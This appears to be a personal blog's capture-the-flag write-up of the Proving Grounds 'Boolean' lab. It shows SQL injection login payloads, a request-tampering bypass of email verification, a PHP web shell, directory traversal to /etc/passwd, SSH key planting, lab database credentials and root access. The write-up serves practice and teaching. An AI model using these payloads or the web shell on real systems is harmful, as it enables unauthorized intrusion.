@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Boolean Writeup - Rachel Murphy" />
+  <title>PG: Boolean | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    .code-block { margin: 1rem 0; }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+    .meta { color: #cbd5e1; font-size: 0.95rem; margin-bottom: .5rem; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="wrap">
+      <h1>Boolean — Writeup</h1>
+      <p class="meta">Proving Grounds — Web Exploitation & Privilege Escalation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <!-- Machine summary / description -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> Boolean is an intermediate-level Linux machine on OffSec’s Proving Grounds Practice platform. It’s designed to test reconnaissance, web application exploitation, and privilege escalation skills. Typical compromise involves bypassing an email verification check via parameter tampering, exploiting a file upload/directory traversal flaw to gain user access, and finally leveraging a misconfigured SSH key to escalate to root. It’s a realistic lab for OSCP-style practice.</p>
+
+      <h3>Key Features</h3>
+      <ul>
+        <li>Web application exploitation: Boolean-based SQLi and parameter manipulation.</li>
+        <li>File upload + directory traversal to plant SSH keys.</li>
+        <li>Privilege escalation via exposed root SSH key.</li>
+      </ul>
+    </section>
+
+    <!-- Reconnaissance -->
+    <section>
+      <h2>Initial Reconnaissance</h2>
+      <p>First, scanned the host with Nmap to identify open ports and services:</p>
+      <div class="code-block">
+        <pre>sudo nmap -sC -sV -vv 192.168.247.42 -oN nmap-boolean</pre>
+      </div>
+      <img src="../images/Pasted image 20250709162701.png" alt="Nmap scan results" class="screenshot">
+
+      <p>Then scanned all ports to catch anything missed:</p>
+      <div class="code-block">
+        <pre>sudo nmap -sC -sV -vv -p- 192.168.247.42 -oN nmap-boolean-all-ports</pre>
+      </div>
+    </section>
+
+    <!-- Web exploitation -->
+    <section>
+      <h2>Web Application Testing</h2>
+      <p>Visited the web service on port 80 and identified a login form vulnerable to SQL injection. Tested a few common Boolean-based payloads:</p>
+      <div class="code-block">
+<pre>admin' OR 1=1 -- -
+admin' AND 1=1 -- -
+admin' OR '1'='1
+admin' OR '1'='0</pre>
+      </div>
+      <img src="../images/Pasted image 20250709164644.png" alt="Login page" class="screenshot">
+
+      <p>Created a new account for further testing:</p>
+      <img src="../images/Pasted image 20250709164850.png" alt="Created account" class="screenshot">
+    </section>
+
+    <!-- Feroxbuster -->
+    <section>
+      <h2>Directory Brute Forcing</h2>
+      <p>Used Feroxbuster to enumerate hidden directories:</p>
+      <div class="code-block">
+        <pre>feroxbuster -u http://192.168.194.231/login -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out</pre>
+      </div>
+      <img src="../images/Pasted image 20250709165128.png" alt="Feroxbuster results" class="screenshot">
+    </section>
+
+    <!-- Parameter manipulation -->
+    <section>
+      <h2>Parameter Manipulation with Burp</h2>
+      <p>The <code>/settings/email</code> endpoint required email confirmation. By intercepting the request in Burp and changing the <code>confirmed</code> parameter to true, I could bypass verification:</p>
+      <img src="../images/Pasted image 20250709211040.png" alt="Request before manipulation" class="screenshot">
+      <img src="../images/Pasted image 20250709211107.png" alt="Response before manipulation" class="screenshot">
+
+      <div class="code-block">
+<pre>_method=patch&authenticity_token=...&user[confirmed=true]&commit=Change%20email</pre>
+      </div>
+
+      <img src="../images/Pasted image 20250709210846.png" alt="Modified request" class="screenshot">
+      <img src="../images/Pasted image 20250709210947.png" alt="Modified response" class="screenshot">
+      <img src="../images/Pasted image 20250709211135.png" alt="Post-manipulation" class="screenshot">
+
+      <p>After logging back in, a file upload feature became available:</p>
+      <img src="../images/Pasted image 20250709211403.png" alt="File upload" class="screenshot">
+    </section>
+
+    <!-- File upload / web shell -->
+    <section>
+      <h2>File Upload & Directory Traversal</h2>
+      <p>Attempted to upload a PHP web shell:</p>
+      <div class="code-block">
+<pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
+      </div>
+      <img src="../images/Pasted image 20250709211844.png" alt="Upload attempt" class="screenshot">
+      <p>However, the file executed as a download instead of executing on the server. I tried directory traversal to read <code>/etc/passwd</code> and identify users:</p>
+      <img src="../images/Pasted image 20250709213304.png" alt="Directory traversal attempt" class="screenshot">
+      <img src="../images/Pasted image 20250709213431.png" alt="User enumeration" class="screenshot">
+    </section>
+
+    <!-- SSH key upload -->
+    <section>
+      <h2>SSH Key Upload & User Access</h2>
+      <p>Generated an SSH keypair and uploaded the public key to <code>/home/remi/.ssh/authorized_keys</code> via the vulnerable file manager:</p>
+      <div class="code-block">
+        <pre>ssh-keygen</pre>
+      </div>
+      <img src="../images/Pasted image 20250709214022.png" alt="SSH keygen" class="screenshot">
+      <img src="../images/Pasted image 20250709214406.png" alt="Uploaded authorized_keys" class="screenshot">
+
+      <p>Connected as <code>remi</code> with the private key:</p>
+      <div class="code-block">
+        <pre>ssh remi@192.168.194.231 -i id_ed25519</pre>
+      </div>
+      <img src="../images/Pasted image 20250709220213.png" alt="SSH as remi" class="screenshot">
+    </section>
+
+    <!-- Privilege escalation -->
+    <section>
+      <h2>Privilege Escalation to Root</h2>
+      <p>Enumerated files and found database credentials:</p>
+      <img src="../images/Pasted image 20250709220820.png" alt="DB credentials found" class="screenshot">
+      <div class="code-block">
+<pre>boolean:superdupersekiyurpass</pre>
+      </div>
+
+      <p>Logged into MySQL to explore databases:</p>
+      <div class="code-block">
+<pre>mysql -u boolean -psuperdupersekiyurpass
+show databases;
+use boolean_development;
+show tables;
+select * from users;</pre>
+      </div>
+      <img src="../images/Pasted image 20250709221348.png" alt="MySQL session" class="screenshot">
+      <img src="../images/Pasted image 20250709221532.png" alt="User table" class="screenshot">
+
+      <p>Ultimately found the root SSH key stored on the box. Used it to SSH as root:</p>
+      <div class="code-block">
+        <pre>ssh -i root root@127.0.0.1</pre>
+      </div>
+      <img src="../images/Pasted image 20250709222031.png" alt="Root shell" class="screenshot">
+    </section>
+  </main>
+
+  <footer>
+    <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc">GitHub</a></p>
+    <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="../../index.html">Home</a></p>
+  </footer>
+
+</body>
+</html>
